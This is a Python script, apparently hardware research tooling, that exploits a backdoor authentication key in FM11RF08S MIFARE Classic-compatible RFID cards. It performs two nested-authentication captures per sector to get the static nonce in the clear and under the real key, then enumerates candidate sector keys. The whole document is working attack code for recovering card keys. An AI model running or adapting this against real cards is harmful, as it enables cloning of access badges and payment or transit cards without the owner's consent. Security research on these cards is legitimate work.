#!/usr/bin/env python3
"""Collect FM11RF08S static-encrypted-nonce data on the 3DS via the backdoor key, then recover.

Per sector/keytype, two nested captures from a backdoor AUTH_FIRST session (cmd 0x64/0x65 = normal
auth | 4, with the backdoor key):
  1. NESTED with backdoor cmd  -> {nt} under the backdoor key -> decrypt -> CLEAR static nt
  2. NESTED with normal cmd    -> SAME nonce under the REAL key -> nt_enc + raw parity
Then staticnested.candidates(uid, nt, nt_enc, par) enumerates key candidates.

Usage: collect_rf08s.py HOST SECTOR a|b [BACKDOOR_KEY] [EXPECTED_KEY]
"""
import sys

import chipmon
import mfc
import staticnested
from crypto1 import Crypto1
from rawa import crc_a

BACKDOOR = "A396EFA4E24F"


def nested_capture(s, known_key, auth_cmd, nested_cmd, tries=6):
    """One OP_NESTED: AUTH_FIRST(auth_cmd, known_key) then encrypted NESTED(nested_cmd). Returns
    (nt0, enc_nt, par_bits[4]) or None. auth_cmd/nested_cmd are 2-byte [cmd, block]. The static-nonce
    card flakes on a cold auth, so retry (re-selecting each time)."""
    af = bytes(auth_cmd) + crc_a(bytes(auth_cmd))
    frame, code = mfc.pack(af)
    nc = bytes(nested_cmd) + crc_a(bytes(nested_cmd))
    uid = int.from_bytes(s.uid, "big")
    for _ in range(tries):
        s.parity(True)
        if s.select() is None:
            continue
        s.parity(False)
        s.mon.frames()
        nt0 = s.mon.nested(known_key, uid, 0x12345678, frame, code, nc)
        if nt0 is None:
            continue
        fr = s.mon.frames()
        if not fr:
            continue
        b, par = mfc.unpack(fr[-1][1], 4, 4)
        if len(b) < 4:
            continue
        return nt0, int.from_bytes(b, "big"), par
    return None


def main():
    host, sec, kt = sys.argv[1], int(sys.argv[2]), sys.argv[3].lower()
    bd = bytes.fromhex(sys.argv[4]) if len(sys.argv) > 4 else bytes.fromhex(BACKDOOR)
    expect = sys.argv[5].lower() if len(sys.argv) > 5 else None
    ktb = 1 if kt == "b" else 0
    block = mfc.first_block(sec)
    bd_cmd = 0x64 + ktb   # backdoor auth command
    nr_cmd = 0x60 + ktb   # normal auth command

    s = mfc.Session(host)
    if not s.start():
        print("start failed (no card?)")
        return 1
    uid = int.from_bytes(s.uid, "big")
    print(f"UID {s.uid.hex()} SAK {s.sak:02x}  sector {sec} key {kt.upper()} block {block}")

    # Capture 1: clear static nt via the backdoor (both auth and nested use the backdoor cmd+key).
    c1 = nested_capture(s, bd, [bd_cmd, block], [bd_cmd, block])
    if not c1:
        print("capture 1 (backdoor nested) failed")
        return 1
    nt0a, enc_bd, _ = c1
    cc = Crypto1(bd)
    nt = cc.word((uid ^ enc_bd), encrypted=True) ^ enc_bd
    print(f"  cap1 nt0={nt0a:08x} enc(bd)={enc_bd:08x} -> clear static nt={nt:08x}")

    # Capture 2: same static nonce encrypted under the REAL key + its parity.
    c2 = nested_capture(s, bd, [bd_cmd, block], [nr_cmd, block])
    if not c2:
        print("capture 2 (normal nested) failed")
        return 1
    nt0b, nt_enc, par = c2
    par_enc = (par[0] << 3) | (par[1] << 2) | (par[2] << 1) | par[3]
    print(f"  cap2 nt0={nt0b:08x} nt_enc={nt_enc:08x} par={''.join(map(str,par))}")

    ks = staticnested.candidates(uid, nt, nt_enc, par_enc)
    print(f"{len(ks)} candidates")
    if expect is not None:
        print(f"expected {expect}: {'FOUND' if any(f'{k:012x}'==expect for k in ks) else 'NOT FOUND'}")


if __name__ == "__main__":
    sys.exit(main())
